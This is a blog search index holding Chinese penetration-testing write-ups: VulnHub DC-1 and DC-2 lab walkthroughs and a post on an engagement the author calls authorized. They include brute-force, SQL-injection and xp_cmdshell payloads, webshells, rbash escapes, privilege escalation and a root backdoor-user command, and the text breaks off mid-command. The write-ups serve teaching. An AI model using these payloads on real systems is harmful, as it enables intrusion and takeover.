<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>VulnHub-DC2(二)</title>
      <link href="2020/11112.html"/>
      <url>2020/11112.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　靶机名称:DC:2　　靶机难度:入门　　靶机ip:10.16.122.1　　下载地址:<a href="https://www.vulnhub.com/entry/dc-2,311/">https://www.vulnhub.com/entry/dc-2,311/</a><br><a id="more"></a></p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>　　输入ip地址后，出现如图情况<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUhF3V.png"><br>　　host文件添加对应dns解析即可<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUhDv8.png"><br>　　拉倒底部后，发现是wordpress框架<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUh42V.png"><br>　　这里可以使用nmap漏洞扫描功能，也可以使用wpscan，然而kali自带的wpscan太老了已经没法更新了，需要手动去下载，还要申请api token才能使用。这里我选择使用nmap<br>　　nmap -sV -A –script=vuln 10.16.122.1 发现后台地址和用户名，但是这里并没有扫出wordpress版本，有时能扫出。<br>　　<img src="https://s1.ax1x.com/2020/10/31/BULps1.png"><br>　　也可以用审查元素查看版本<br>　　<img src="https://s1.ax1x.com/2020/10/31/BULztS.png"><br>　　搜索后并没有发现有4.7.10的exp，但找到了路径<code>/index.php/wp-json/wp/v2/users</code>下存在信息泄露<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUO29g.png"><br>　　使用json格式化后，得到了两个用户admin和jerry，也是nmap已扫到的<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUXvRg.png"></p><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>　　在主页出直接显示了flag1，提示用cewl命令<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUjZz4.png"><br>　　<code>cewl http://dc-2 -w pwd.txt</code>将会在当前目录下生成抓取的密码文件<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUvZAP.png"><br>　　然后在新建一个user.txt，将前面nmap扫出的admin，tom，jerry用户写进去<br>　　<img src="https://s1.ax1x.com/2020/10/31/BUvU9U.png"><br>　　nmap哪里已经扫出了后台地址http://<span>dc-2/wp-login.php</span><br>　　<img src="https://s1.ax1x.com/2020/10/31/BUvH4f.png"><br>　　接下来使用大名鼎鼎的hydra吧<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">hydra -L user.txt -P pwd.txt dc-2 http-post-form <span class="token string">"/wp-login.php:log=^USER^&amp;pwd=^PASS^:&lt;strong>ERROR&lt;/strong>"</span>-s   指定端口-vV  显示爆破细节-f   找到正确的账密就停止爆破<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>　　成功爆破出tom和jerry，这里要使用jerry账号登陆，tom账号权限不够<br>　　<img src="https://s1.ax1x.com/2020/10/31/BapBRK.png"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>　　登陆进后，来到pages即可得到flag2<br>　　意思是如果在此界面无法利用，就换一条路<br>　　<img src="https://s1.ax1x.com/2020/10/31/Ba9f0J.png"><br>　　发布文章时，尝试上传图片马，提示没有权限<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaCE7j.png"><br>　　卡了许久，完全没思路，后来看了其他大佬的教程，得知靶机开放了其他端口，可见信息搜集的重要性<br>　　<code>nmap -p1-65535 10.16.122.1</code><br>　　<img src="https://s1.ax1x.com/2020/10/31/BaC6UA.png"><br>　　全端口扫描后得到开放了7744，发现其实是ssh服务<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaPZrD.png"><br>　　接下来还是使用hydra爆破ssh<br>　　<code>hydra -L user.txt -P pwd.txt -s 7744 10.16.122.1 ssh</code>,你会发现tom的ssh的登陆密码和web登陆密码是一模一样的<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaFknO.png"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>　　直接ls发现flag3<br>　　<img src="https://s1.ax1x.com/2020/10/31/BakpVg.png"><br>　　使用cat flag3.txt出现命令未找到<br>　　<img src="https://s1.ax1x.com/2020/10/31/BakXFJ.png"><br>　　发现是rbash简单点说，就是只能使用一部分命令，发现vi命令可以查看flag3<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaAAFH.png"><br>　　这里也可以使用echo+vi查看文件和文件夹，这样也得到了flag4<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaE99s.png"><br>　　继续上面的flag3，提示用jerry用户登陆，那么现在就要绕过rbash<br>　　网上找了很多vi命令的绕过，都写的云里雾里的，这里给出详细过程<br>　　1.vi 绕过<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vi</span>:set <span class="token assign-left variable">shell</span><span class="token operator">=</span>/bin/bash:shell<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin/<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>　　进入vi命令行模式后，输入后:set shell=/bin/bash回车<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaVqw8.png"><br>　　这里光标会跑到第一行，不用管它<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaeQvn.png" height="50%"><br>　　继续进入命令行，输入:shell，回车后，会得到一个shell<br>　　<img src="https://s1.ax1x.com/2020/10/31/BatpcV.png"><br>　　<img src="https://s1.ax1x.com/2020/10/31/BamQiD.png"><br>　　咋一看跟原来的一模一样，不急依次输入<br>　　export PATH=$PATH:/bin/<br>　　export PATH=$PATH:/usr/bin<br>　　这两条命令后，已经绕过了rbash了，并且成功使用cat命令<br>　　<img src="https://s1.ax1x.com/2020/10/31/BamjYD.png"></p><p>　　2.BASH_CMDS[a]=/bin/sh;a 绕过</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token environment constant">BASH_CMDS</span><span class="token punctuation">[</span>a<span class="token punctuation">]</span><span class="token operator">=</span>/bin/sh<span class="token punctuation">;</span>a<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/bin/<span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/bin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>　　<img src="https://s1.ax1x.com/2020/10/31/Ban8tU.png"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>　　接下来就切换到jerry用户，而tom的ssh密码和web登陆是一样的，所以这里的jerry的ssh密码可以尝试使用前面已经爆破出来的adipiscing<br>　　输入<code>su jerry</code> 密码:adipiscing，成功登陆后，查看到flag4<br>　　<img src="https://s1.ax1x.com/2020/10/31/BatDEQ.png"><br>　　提示用git提权到root<br>　　<code>sudo -l</code> 查询root权限，可看到/usr/bin/git是root权限执行，并且不需要密码<br>　　<img src="https://s1.ax1x.com/2020/10/31/Bat7CR.png"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>　　那么接下来就是提权了，git提权参考文章<a href="https://gtfobins.github.io/gtfobins/git/">https://gtfobins.github.io/gtfobins/git/</a><br>　　1.第一种</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">git</span> <span class="token builtin class-name">help</span> config<span class="token operator">!</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>　　2.第二种<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">git</span> branch --help config<span class="token operator">!</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><br>　　3.第三种<br><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">TF</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span>mktemp -d<span class="token variable">)</span></span><span class="token function">ln</span> -s /bin/sh <span class="token string">"<span class="token variable">$TF</span>/git-x"</span><span class="token function">sudo</span> <span class="token function">git</span> <span class="token string">"--exec-path=<span class="token variable">$TF</span>"</span> x<span class="token operator">!</span>/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>　　这里演示第一种，输入<code>sudo git help config</code>后，会强行分页显示<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaNQx0.png"><br>　　继续输入<code>!/bin/bash</code>回车<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaNBM6.png"><br>　　提权成功并在root目录下查看到最终flag<br>　　<img src="https://s1.ax1x.com/2020/10/31/BaNcIH.png"></p>]]></content>
      
      
      <categories>
          
          <category> VulnHub </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>VulnHub-DC1(一)</title>
      <link href="2020/55500.html"/>
      <url>2020/55500.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　Vulnhub是一个提供各种漏洞的靶机网站，本章靶机是入门级别的dc1，<a href="https://www.vulnhub.com/entry/dc-1,292/">下载</a>，我们的目标是要找到5个flag。下载后是的ova文件导入VMware Workstation15（低版本不支持导入ova文件）。<br><a id="more"></a></p><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>　　打开靶机后，是不知道密码的，第一次打靶的我还很疑惑为什么不给密码……<br>　　<img src="https://s1.ax1x.com/2020/10/29/BGvebT.png"><br>　　<code>nmap -sn 10.16.122.0/24</code>得到靶机ip为10.16.122.6<br>　　<img src="https://s1.ax1x.com/2020/10/29/BGxVWd.png"><br>　　<code>nmap -A --script=vuln 10.16.122.6</code>探测主机信息<br>　　开放了80和22端口，并且存在cve-2014-3704，如果你觉得自己人品好就去爆破吧(ಡωಡ)<br>　　<img src="https://s1.ax1x.com/2020/10/29/BGzeNF.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>　　使用burp截取到登陆请求包，并发送到Repeater<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJSoQA.png"><br>　　cve-2014-3704这个漏洞是sql注入，能直接数据库添加用户名和密码<br>　　payload</p><pre class="line-numbers language-none"><code class="language-none">name[0%20;update+users+set+name%3d&#39;root&#39;+,+pass+%3d+&#39;$S$DkIkdKLIvRK0iVHm99X7B&#x2F;M8QC17E1Tp&#x2F;kMOd1Ie8V&#x2F;PgWjtAZld&#39;+where+uid+%3d+&#39;1&#39;;;#%20%20]&#x3D;test3&amp;name[0]&#x3D;test&amp;pass&#x3D;shit2&amp;test2&#x3D;test&amp;form_build_id&#x3D;&amp;form_id&#x3D;user_login_block&amp;op&#x3D;Log+in<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　将上述payload贴进来，发包后，将会创建一个用户名为:root 密码:thanks的账户，如果登陆失败，多发几次包即可。<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJPtl4.png"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>　　登陆进来后，点击最上面的content获取到flag3<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJFXF0.png"><br>　　flag3提示用find -exec，想到用suid提权<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJk9OJ.png"><br>　　来到modules，开启php filter<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJkH1O.png"><br>　　新建articel文章，并写入php一句话木马&lt;?php @eval($_POST[“x”]); ?&gt;，底下的text format换成PHP code<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJADDH.png"><br>　　文章成功发布后，使用蚁剑连接</p><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>　　ls后，直接在当前目录发现flag1.txt<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJMM2n.png"><br>　　flag1提示查看站点配置文件<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJMDr6.png"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>　　Drupal的默认配置文件为  /var/www/sites/default/settings.php，查看后<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJQolR.png"><br>　　获取到数据库信息，告诉你可以选择爆破，我反正不会这样做</p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>　　使用find / -name flag*.txt命令，直接来查找flag文件，获取到flag4<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJldnx.png"><br>　　你能成功访问到/root下的flag吗？恩，我能！<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJlc3d.png"></p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>　　看来接下来就是要提权了<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJljbV.png"><br>　　uname -a后得到Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux<br>　　尝试使用脏牛提权，好像make版本太低<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJ1Eb6.png"><br>　　换个思路，前面提示说suid提权，试试<br>　　<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试</span><span class="token function">find</span> / -perm -u<span class="token operator">=</span>s -type f <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / -user root -perm -4000-print<span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token function">find</span> / -user root -perm -4000-exec <span class="token function">ls</span> -ldb <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>　　这里前面提示的find<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJ3peP.png"><br>　　root权限<br>　　<img src="https://s1.ax1x.com/2020/10/29/BJ3lYF.png"><br>　　如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">touch</span> <span class="token builtin class-name">test</span><span class="token function">find</span> <span class="token builtin class-name">test</span> -exec <span class="token function">whoami</span> <span class="token punctuation">\</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>　　<img src="https://s1.ax1x.com/2020/10/29/BJ3L7V.png"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>　　<img src="https://s1.ax1x.com/2020/10/29/BJdYXF.png"></p><h3 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h3><p>　　既然都是root，哪就添加一个用户吧<br>　　一句话添加用户并且是root权限，用户名:lion 密码:123456</p><pre>useradd -p`openssl passwd -1 -salt 'salt' 123456` lion -o -u 0 -g root -G root -s /bin/bash -d /home/test</pre><p>　　<img src="https://s1.ax1x.com/2020/10/29/BJwg2V.png">　　</p>]]></content>
      
      
      <categories>
          
          <category> VulnHub </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一次授权渗透实战</title>
      <link href="2020/45983.html"/>
      <url>2020/45983.html</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　最近刚好闲来无事，打开微信接到要一个对网站进行渗透测试的消息，对方发来网站后，马不停蹄的开始。<b>(本次渗透过程均在目标授权下进行，请勿进行非法渗透行为)</b><br>　　<a id="more"></a></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>　　打开网站，一股简陋破败风引面而来，随即注册一个账号，以便后面的登录<br>　　<img src="https://s1.ax1x.com/2020/10/12/0WsEgf.png"><br>　　利用wappalyzer浏览器插件，获取到的信息，对于我这个菜鸡而言，并没有看到可以有用的东西<br>　　<img src="https://s1.ax1x.com/2020/10/12/0WRxJJ.png"><br>　　得到waf为OWASP CRS<br>　　<img src="https://s1.ax1x.com/2020/10/13/0huNAH.png"><br>　　使用nmap扫描，nmap -O -v -Pn 61.157.xx.xx<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hdVu4.png"><br>　　开放的端口少之又少，基本没啥可利用的。又结合web服务器是iis，再根据nmap猜测的操作系统，确定操作系统为win server 2012<br>　　再用nmap自带的漏洞利用脚本，nmap –script=vuln 61.157.xx.xx<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hdGKe.png"><br>　　主机安全做的很好，数据库禁止外连，让我无从下手，只有换一条路<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hwidA.jpg"><br>　　直接上御剑后，看到admin字符，让我心中小喜，果断打开<br>　　<img src="https://s1.ax1x.com/2020/10/12/0WfkXq.png"><br>　　尝试弱口令登陆<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fs27Q.png"><br>　　神奇的一幕出现了，竟然验证码有误?<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fy84s.png"><br>　　后来不管我怎么输入，都只会出现一个提示”验证码有误!”，看来对方的设计是大家来一个同归于尽，这条路只好放弃了<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fyyCR.jpg">　　</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p>　　登陆进去后，发现有上传头像的地方，果断试试能不能上传马<br>　　尝试content-type能否绕过<br>　　<img src="https://s1.ax1x.com/2020/10/13/0f6LWR.png"><br>　　看来对方是要校验后缀名，而且还是白名单的形式，看是否有iis解析漏洞，期间我搜了许多都没有找到iis8.5漏洞文章<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fcJXV.png"><br>　　上传一次正常图片后，虽然给出图片路径，但文件名是根据时间戳命名的图片，并且统一后缀名为png，这种看到就换条路吧<br>　　<img src="https://s1.ax1x.com/2020/10/13/0fgc2n.png"><br>　　看到重置登陆密码，我就猜想这个框是否存在sql注入呢<br>　　<img src="https://s1.ax1x.com/2020/10/13/0huvgx.png"><br>　　<img src="https://s1.ax1x.com/2020/10/13/0hnBmF.png"><br>　　难道就这样放弃了吗，我停下手中的键盘想了想。无论我怎么修改密码字符，都提示密码错误，那么肯定是将cookie中(shouji)参数代入sql语句，然后在将密码参数代入，看两个参数是否同时匹配数据库。也就是说shouji参数也可能存在sql注入<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hMmWR.png"><br>　　这都不拦截？形同虚设的waf<br>　　<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hMBm8.th.jpg"><br>　　<br>　　直接上sqlmap，以前从来没有碰到过注入点在cookie里面的，所以sqlmap命令格式就卡了我一天。顺便总结一下如果注入点在cookie，并且网站需要登录的命令。<br>　　带上–cookie参数，作用是让sqlmap能登陆进网站，重点来了，必须使用–level 2 后面的数字必须是&gt;=2，它才会检测cookie是否存在注入点<br>　　参考命令如下</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u &quot;http:&#x2F;&#x2F;xxxx&#x2F;tedb&#x2F;user_repwd.aspx&quot; --level 2 --cookie&#x3D;&quot;member&#x3D;id&#x3D;45230&amp;shouji&#x3D;123456&quot; -p member --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　添加–os-shell参数，看能否直接得到shell<br>　　<img src="https://s1.ax1x.com/2020/10/13/049fD1.png"><br>　　报错信息意思是不支持堆叠注入，这里有<b>疑惑点</b>后面讲<br>　　获取banner信息为Microsoft SQL Server 2008，操作系统win server 2012 or 2008，根据前面的信息 100%确定操作系统为win server 2012<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hJoKs.png"><br>　　获取数据库<br>　　<img src="https://s1.ax1x.com/2020/10/13/0hY5FK.png"><br>　　获取msdb数据库中的表，出现了这一幕<br>　　<img src="https://s1.ax1x.com/2020/10/13/0htiOs.png"><br>　　<img src="https://s1.ax1x.com/2020/10/13/0htJk6.th.jpg" ><br>　　此时天色已晚，躺在床上的我，整理一下思路。首先能获取到数据库信息，那么肯定存在sql注入的，其次是mssql数据库，是不是还有其他办法得到webshell呢？于是打开手机疯狂百度，学习其他大佬的姿势，找到了可以用xp_cmdshell 来让对方服务器远程执行cmd命令。学到了，明天起来验证，睡觉狗命要紧!!!</p><h3 id="利用xp-cmdshell拿到webshell"><a href="#利用xp-cmdshell拿到webshell" class="headerlink" title="利用xp_cmdshell拿到webshell"></a>利用xp_cmdshell拿到webshell</h3><p>　　MSSQL2005及以上版本默认禁用了xp_cmdshell。而如果该扩展存储过程没被删除，就能一句话启用它(不支持多句执行的话，请单独执行每句)<br><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">--开启</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token comment">--关闭</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'show advanced options'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token punctuation">;</span><span class="token keyword">EXEC</span> sp_configure <span class="token string">'xp_cmdshell'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><br>　　<img src="https://s1.ax1x.com/2020/10/18/0jGZo8.png"></p><pre class="line-numbers language-mssql" data-language="mssql"><code class="language-mssql">exec master..xp_cmdshell &quot;whoami&quot; --用来执行cmd命令<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　<img src="https://s1.ax1x.com/2020/10/18/0jJkp4.png"><br>　　能远程执行命令，很nice，果断开启<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jYSvd.png"><br>　　因图片看不清有些标点符号，贴出完整语句</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">shouji<span class="token operator">=</span><span class="token number">123456</span><span class="token string">';EXEC sp_configure '</span><span class="token keyword">show</span> advanced options<span class="token string">',1;RECONFIGURE;EXEC sp_configure '</span>xp_cmdshell'<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">RECONFIGURE</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　可以从图片清楚的看到出现了红色和黑色两部分，这说明黑色部分的语句并没有发送过去，只有红色的部分发送过去了，这也是burp很强大的功能。<br>　　将 ‘;’ url编码成 %3b，其他发送失败的字符也同理(还记得前面写的不支持堆叠注入吗，原因就在于sqlmap中的payload没有将’;’转换成%3b，所以会出现不支持堆叠注入，自己编写一个sqlmap的tamper脚本即可<a href="https://blog.csdn.net/whatday/article/details/62059263">sqlmap tamper脚本编写</a>)<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jtNY8.png"><br>　　执行后，是无法得知对方是否成功开启了xp_cmdshell，所以可以用ping命令返回时间，来判断<br>　　发送后，大约等了10s左右，得到了响应包，说明开启成功<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jNKA0.png"><br>　　先查看一下是什么权限吧<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jUe2D.png"><br>　　<img src="https://s1.ax1x.com/2020/10/18/0jdk9K.png"><br>　　竟然无回显，查阅后得知，可以将结果写入表中，然后查看表中的内容即可</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">drop</span> <span class="token keyword">TABLE</span> D99_CMD<span class="token punctuation">;</span> <span class="token keyword">create</span> <span class="token keyword">TABLE</span> D99_CMD<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">Data</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token keyword">varchar</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ID <span class="token keyword">int</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">IDENTITY</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">insert</span> D99_CMD <span class="token keyword">exec</span> master<span class="token punctuation">.</span>dbo<span class="token punctuation">.</span>xp_cmdshell <span class="token string">'whoami'</span> <span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　将执行的结果写进D99_CMD表<br>　　<img src="https://s1.ax1x.com/2020/10/18/0jw7WV.png"><br>　　改变id=1后面的数字即可查看表中对应的行的内容，只能一行一行的查看，这也是非常鸡肋的地方</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">-- 查看表中的内容</span><span class="token operator">And</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">Top</span> <span class="token number">1</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span> <span class="token keyword">data</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span> <span class="token keyword">From</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">Top</span> <span class="token number">1</span> <span class="token punctuation">[</span>ID<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token keyword">Data</span><span class="token punctuation">]</span> <span class="token keyword">From</span> D99_CMD <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token keyword">Order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>ID<span class="token punctuation">]</span><span class="token punctuation">)</span> T <span class="token keyword">Order</span> <span class="token keyword">by</span> <span class="token punctuation">[</span>ID<span class="token punctuation">]</span> <span class="token keyword">desc</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token comment">-- 获取表有多少行</span><span class="token operator">And</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token keyword">char</span><span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>Bcast<span class="token punctuation">(</span><span class="token function">Count</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">8000</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">2</span>Bchar<span class="token punctuation">(</span><span class="token number">124</span><span class="token punctuation">)</span> <span class="token keyword">From</span> D99_CMD<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>　　<img src="https://s1.ax1x.com/2020/10/18/0jB6KS.png"><br>　　<img src="https://s1.ax1x.com/2020/10/18/0jBOa9.png"><br>　　注意这里的system权限，是对方cmd.exe拥有的system权限，即本地cmd执行whoami，返回的内容<br>　　查看对方有哪些盘</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">for</span> <span class="token operator">%</span>i in <span class="token punctuation">(</span>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<span class="token punctuation">)</span> <span class="token keyword">do</span> @<span class="token keyword">if</span> exist <span class="token operator">%</span>i: <span class="token function">echo</span> <span class="token operator">%</span>i:<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>　　执行命令后，查看表中的内容，如果出现”此时不应有 i。”，将payload进行url编码，重新发送后即可<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vf1sA.png"><br>　　获取到对方有c,d盘<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vIwt0.png"><br>　　接下来，就要获取网站的物理路径<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vIgB9.png"></p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#在c盘下查找user_repwd.aspx文件的物理路径 注意文件名后面一定要有'*'号</span><span class="token keyword">for</span> <span class="token operator">/</span>r c:\ <span class="token operator">%</span>i in <span class="token punctuation">(</span>user_repwd<span class="token operator">*</span><span class="token punctuation">.</span>aspx<span class="token punctuation">)</span> <span class="token keyword">do</span> @<span class="token function">echo</span> <span class="token operator">%</span>i <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>　　当我查看表中的内容时，无任何回显于是，在d盘下搜索，得到<br>　　<img src="https://s1.ax1x.com/2020/10/19/0vTUJ0.png"><br>　　其实在我最开始的时候，我没有先执行获取对方有哪些盘符的命令，而是先执行c盘下获取文件路径命令。当输出表结果是无任何回显时，我是非常懵逼的，我一度怀疑命令是不是执行失败，而没有第一次时间考虑到对方有多个盘符，导致我在这里浪费了几个小时。。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#将一句话木马写入文件</span><span class="token function">echo</span> ^&lt;<span class="token operator">%</span>@ Page Language=<span class="token string">"Jscript"</span><span class="token 